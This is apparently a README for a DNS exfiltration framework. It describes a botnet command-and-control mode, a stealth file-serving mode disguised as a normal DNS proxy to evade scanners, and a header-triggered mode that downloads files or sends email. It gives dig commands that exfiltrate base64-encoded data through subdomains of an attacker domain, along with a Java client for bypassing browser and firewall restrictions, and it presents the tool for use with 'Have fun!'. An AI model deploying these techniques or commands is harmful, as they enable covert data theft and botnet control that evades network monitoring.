# dns_exfiltration

A framework for writing DNS exfiltration modes and example exfiltrators.

##Server Setup:
Nothing!
nothing special is required except that port 53 be available.
However, if the server also happens to be the NS authority for a domain, you will be able to use DNS routing
to trafifc information for you as well


##Example exfiltrators

This code comes with three example exfiltrators, which are described below

_Bot mode:_
This is your basic botnet command and control.
As data is exfiltrated from clients, it is appended to a file. This file can be a log of events
or could a file upload. Data is sent in base64-encoded subdomains using A records to upload data
from client to server. The MX record reads from a special command file. The command file is intended for sending
commands from the DNS server to the clients under it's control.

This is especially useful in situations where TCP connections are blocked or monitored at application or network
level. Some sandboxed applications such as java browser applications are prohibited from connect()'ing to TCP
sockets, but the gethostbyname  and other system calls are often permitted. This leaves a way to transmit information
out without the pesky connect(). This might also be used to circumvent firewalls or routing constraints, instead
using the recursive DNS system to route data to it's desitination.

To exfiltrate data this way is easy, using dig or the supplied exfil_client command line utilies provided by
this package. (replace example.com with your authoritative domain name, of course)

```
dig $(echo exfiltrate me | base64).filename.example.com

dig MX example.com
```

To pair with bot mode, there is a java client provided in this repository. When this jar is served from a browser
it can circumvent the same-domain constraints of the browser, uploading files to the server upon command.
The java client has compile-time dependencies. You'll need to include org.xbill.DNS to make DNS requests and org.apache.commons.codec for Base64. You can just extract those and edit the Makefile accordingly.

```bash
make
make jar
java -jar DefConGui.jar
```



_chunk mode:_

This turns your DNS server into a file server that uses a high TTL to cache files in DNS caches.
It works by dividing your files into evenly-sized chunks, and using a similar technique as bot mode, responds
with the chunk as a base64 encoded subdomain. This method has the benefit of being cachable. This is not used
for command and control, so we want the server response to be as highly cached as possible to offload storage
onto other DNS servers. This also enables us to send and retrieve files much faster, as we do not need to wait
for server responses between each packet to ensure packet ordering. The position is a simple calculation beween
the chunk number and the size of each chunk.

This mode has the additional benefit that it can be on all the time and will appear to be anormal, fully functional
DNS server to anyone who uses it. All requests are proxied back to a real DNS server, and the fake responses are
appended to the end the real response only if exfiltration is possible. That means scanners will not detect anything
amiss about this server. It only misbehaves when you ask it to ;)

The supplied commandline in this package will let you upload, download, and list files on the chunk-mode server, but you can also do use the protocol with dig (although, quite slowly, and with great effort)

File listing:
```
dig TXT example.com
```

chunk download:
lets say you have a file that is 1,000 chunks if the chunk size is 30 bytes.
You'll have all the information you need if you do this. The server will respond with base64 encoded 
data along with real data from the base domain.

```
for chunk in {0..999}
do
  dig MX c"${chunk}".s30.filename.example.com
done
```

chunk upload:
```
dig <base64_data>.c0.s30.filename.example.com
```


_header executer_
this method does not use the domain name to encode data. Unlike the other two modes, in which the data exfiltrated
are files transferred between client and server. In this method, we have a normally functioning DNS server which
does additional work when a subtle, configurable change is made to the DNS header on the request.

This mode has a number of actions which are taken when the crafted DNS query arrives in additional to processing
and responding with a valid and correct response. The instruction in this exfiltrator is sent as the header ID,
which allows the exfiltrator to have large number of instructions that could be executed.

Included in theis exfiltrator are commands to 'download', 'email' or 'hello', which cause the exfiltrator to read
the query name, and download the url to a file, email the url to a configured user, or just print hello to the console.

Again, the supplied command line server and client are functional for using this mode.




## Writing your own exfiltrator

Extending this code is quite easy. If you are familiar with writing a website using a web framework like django or
flask, this will look similar.

create a folder in exfiltrators and create files called 'cli.py', 'server.py' and 'client.py'
The server and client should inherit from one of the base classes.

Writing the server:

By default, the base classes will respond with real results to all  queries, by passing the request back to a backend.
Override the functionality of a method by creating a class method with  the same name as a DNS query type. ('A', 'MX', 'TXT', 'NS', for example). All the DNS details are taken care of, the methods you write should take the name as a
string and should return the result as a string

Wrting the client:

When writing the client, there are fewer niceties. I expect you to need to use dnslib in the client in order
to make specific kinds of requests.

Gluing it together in the CLI.

Use the click() methods to ceate a subcommand.

Register the subcommands as client or server by eding dns_exfil.cli.client or dns_exfil.cli.server respectively.


Have fun!
